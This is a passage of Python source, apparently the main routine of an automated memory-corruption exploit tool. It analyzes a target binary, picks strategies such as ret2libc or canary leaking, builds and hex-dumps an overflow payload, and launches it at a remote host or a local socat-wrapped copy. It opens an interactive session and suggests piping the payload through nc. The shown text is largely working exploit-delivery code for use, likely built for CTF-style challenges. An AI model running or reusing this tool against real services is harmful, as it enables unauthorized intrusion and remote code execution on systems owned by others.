
    # Step 1: Analyze
    print(C.hdr("STEP 1: STATIC ANALYSIS"))
    engine.analyze()
    engine.print_report()
    print()

    # Step 2: Recommend strategy
    print(C.hdr("STEP 2: STRATEGY RECOMMENDATION"))
    recs = engine.recommend_strategy()
    for strat, priority, reason in recs:
        marker = C.GRN + ">>>" if strat == recs[0][0] else "   "
        print(f"  {marker} {strat:15s} (priority {priority:3d}): {reason}{C.RST}")
    print()

    # Step 3: Build payload
    print(C.hdr("STEP 3: PAYLOAD BUILDING"))
    payload, desc = engine.build_payload(
        strategy=args.strategy, offset=args.offset,
        win_func=args.func, shellcode_addr=sc_addr, args=func_args,
        canary_offset=args.canary_offset, no_align=args.no_align)
    if payload:
        print(C.hit(f"Payload ready ({len(payload)} bytes)"))
        if args.verbose or args.dump:
            print(C.sub("Payload hex dump"))
            for i in range(0, len(payload), 16):
                chunk = payload[i:i+16]
                hexstr = ' '.join(f'{b:02x}' for b in chunk)
                ascstr = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                print(f"  {i:04x}: {hexstr:<48s} {ascstr}")
    print()

    # Step 4: Exploit
    if args.dump:
        print(C.info("--dump specified, skipping remote connection"))
        if payload is None:
            print(C.err("No payload generated, cannot save. Check strategy/offset."))
        else:
            # Save payload to file
            payload_file = os.path.join(
                os.path.dirname(args.binary) or '.',
                'payload.bin')
            with open(payload_file, 'wb') as f:
                f.write(payload)
            print(C.hit(f"Payload saved to {payload_file}"))
    elif args.local:
        # Local test mode: spawn binary with socat
        print(C.hdr("STEP 4: LOCAL TESTING"))
        if not shutil.which('socat'):
            print(C.err("socat not found. Install with: apt install socat / brew install socat"))
        else:
            import subprocess
            import random
            local_port = random.randint(30000, 40000)
            binary_abs = os.path.abspath(args.binary)
            socat_cmd = f"socat TCP-LISTEN:{local_port},reuseaddr,fork EXEC:{binary_abs}"
            print(C.info(f"Spawning: {socat_cmd}"))
            proc = subprocess.Popen(socat_cmd.split(), stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
            time.sleep(0.5)
            if libc_offsets:
                engine.libc_offsets = libc_offsets
            elif libc_path:
                engine.libc_path = libc_path
                engine.libc_offsets = engine._get_libc_offsets_from_elf(libc_path)
            try:
                engine.run_remote("127.0.0.1", local_port,
                                  interactive=not args.no_interactive, ssl=False,
                                  cmd=getattr(args, 'cmd', None))
            finally:
                proc.terminate()
                proc.wait()
    elif host and port:
        print(C.hdr("STEP 4: REMOTE EXPLOITATION"))
        if libc_offsets:
            engine.libc_offsets = libc_offsets
        elif libc_path:
            engine.libc_path = libc_path
            engine.libc_offsets = engine._get_libc_offsets_from_elf(libc_path)
        engine.run_remote(host, port, interactive=not args.no_interactive, ssl=args.ssl,
                          cmd=getattr(args, 'cmd', None))
    elif args.strategy in ('ret2libc', 'canary_leak'):
        print(C.warn(f"{args.strategy} requires --remote or --local for two-stage exploitation"))
    else:
        print(C.info("No --remote specified. Use --dump to save payload,"))
        print(C.info("or --remote host:port to exploit."))
        print(C.info("Payload is ready to use with:"))
        print(C.info(f"  (cat payload.bin; cat) | nc <host> <port>"))

    print()
    print(C.hdr("DONE"))


if __name__ == '__main__':
    main()